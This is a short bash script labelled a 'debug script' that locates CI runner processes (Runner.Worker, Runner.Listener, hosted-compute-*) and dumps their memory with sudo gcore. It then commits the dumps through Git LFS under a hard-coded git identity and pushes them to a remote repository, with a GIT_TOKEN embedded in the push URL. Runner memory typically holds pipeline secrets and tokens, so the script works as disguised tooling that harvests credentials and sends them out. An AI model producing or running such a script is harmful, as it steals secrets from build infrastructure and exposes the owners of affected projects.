#!/bin/bash

# Debug script: List PIDs and dump memory for a selected process by name

set -e

# List all running processes with their PIDs and command names
ps -eo pid,comm --sort=pid

# Define process name prefixes to match
PREFIXES=("hosted-compute-" "Runner.Listener" "Runner.Worker")

# Find matching PIDs
MATCHED_PIDS=()
for prefix in "${PREFIXES[@]}"; do
    while read -r pid comm; do
        if [[ "$comm" == $prefix* ]]; then
            MATCHED_PIDS+=("$pid:$comm")
        fi
    done < <(ps -eo pid,comm --no-headers)
done

if [ ${#MATCHED_PIDS[@]} -eq 0 ]; then
    echo "No matching processes found for prefixes: ${PREFIXES[*]}"
    exit 1
fi

for entry in "${MATCHED_PIDS[@]}"; do
    pid="${entry%%:*}"
    comm="${entry#*:}"
    echo "Selected PID: $pid for process: $comm"

    # Check if gcore is available
    if ! command -v gcore &> /dev/null; then
        echo "gcore (GNU core dump utility) is not installed. Installing..."
        sudo apt-get update && sudo apt-get install -y gdb
        if ! command -v gcore &> /dev/null; then
            echo "Error: gcore could not be installed."
            exit 2
        fi
    fi

    # Dump memory to core.$pid file
    sudo gcore -o core "$pid"
    DUMP_FILE="core.$pid"
    echo "Memory dump created: $DUMP_FILE"
    git config --global user.name "thefaftek-git"
    git config --global user.email "thefaftek-git@users.noreply.github.com"
    # Add dump to git lfs tracking if not already tracked
    if ! grep -q '\*.core.*' .gitattributes 2>/dev/null; then
        git lfs track "*.core*"
        git add .gitattributes
        git commit -m "Track core dump files with Git LFS"
        REPO_URL=$(git config --get remote.origin.url)
        REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@${REPO_URL#https://}"
        git push "$REPO_URL_AUTH" HEAD:$(git rev-parse --abbrev-ref HEAD)
    fi

    # Add, commit, and push the dump
    git add "$DUMP_FILE"
    git commit -m "Add memory dump: $DUMP_FILE"

    # Pull and rebase to avoid non-fast-forward errors
    REPO_URL=$(git config --get remote.origin.url)
    REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@${REPO_URL#https://}"
    git pull --rebase "$REPO_URL_AUTH" main
    git lfs push origin --all
    git push "$REPO_URL_AUTH" HEAD:$(git rev-parse --abbrev-ref HEAD)
    echo "✅ Memory dump $DUMP_FILE committed and pushed successfully."
done
